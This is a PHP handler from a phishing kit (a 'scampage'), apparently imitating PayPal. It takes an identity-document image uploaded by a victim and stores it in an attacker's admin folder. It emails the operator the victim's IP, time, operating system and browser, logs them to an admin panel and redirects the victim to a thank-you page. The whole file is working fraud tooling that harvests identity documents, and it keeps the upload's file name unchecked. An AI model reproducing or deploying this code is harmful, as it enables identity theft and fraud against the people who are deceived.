<?php
header('Location: ../thanks.html');
require 'Email.php';
require 'getdata.php';
$ID = "ID Uploded, Go to Admin Panel :)";
$to = "$yourmail";
$subject = "👑PPL ID-IMAGE👑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>FB ID FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>ID INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [ID] = <font style='color:#0070ba;'>$ID</font><br>x
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>Thankx to ✪ Coachella ✪</font> #####################
</div></html>
";

$path = "../../../admin/id/";
$name = rand(1000,100000)."-".$_FILES['up_file']['name'];
$loc = $_FILES['up_file']['tmp_name'];
move_uploaded_file($loc,$path.$name);

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:🤵ID🤵 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);


$message_id = "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>PPL ID FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>ID INFORMATION</font> ]±±±±±±±±±±±±±±±±<br><br>
<img src='../id/$name' style=';border: 1px solid #e1e1e1;border-radius: 3px;padding: 10px;background-color: #fff;width: 360px;'><br><br><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>Thankx to ✪ Coachella ✪</font> #####################
</div></html>
";

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message_id<br><br>", FILE_APPEND);
?>